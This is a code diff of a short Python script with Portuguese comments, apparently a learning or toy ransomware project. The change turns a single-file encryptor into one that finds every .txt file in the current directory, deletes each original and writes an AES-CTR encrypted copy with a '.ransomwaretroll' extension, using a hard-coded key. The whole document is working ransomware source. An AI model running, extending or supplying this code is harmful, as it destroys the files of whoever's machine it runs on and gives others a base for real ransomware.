@@ -1,24 +1,33 @@
-import os
+import os 
 import pyaes
+location = os.getcwd() # Pega o diretório atual
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## remover o arquivo
-os.remove(file_name)
+for file in os.listdir(location): #Pega todos os arquivos dentro do diretório
+    try:
+        if file.endswith(".txt"): #Separa apenas os arquivos terminados em .txt
+            print ("Arquivo .txt encontrado:\t", file)
+            file_opn = open(file, "rb")
+            file_data = file_opn.read()
+            file_opn.close()
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+            ## remover o arquivo
+            os.remove(location+'/'+file)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+            ## chave de criptografia
+            key = b"testeransomwares"
+            aes = pyaes.AESModeOfOperationCTR(key)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+            ## criptografar o arquivo
+            crypto_data = aes.encrypt(file_data)
+
+            ## salvar o arquivo criptografado
+            new_file = file + ".ransomwaretroll"
+            new_file = open(f'{new_file}','wb')
+            new_file.write(crypto_data)
+            new_file.close()
+    except Exception as e:
+        raise e
+        print ("Nenhum arquivo encontrado!")
+     
+print("Arquivos encriptados com sucesso!")
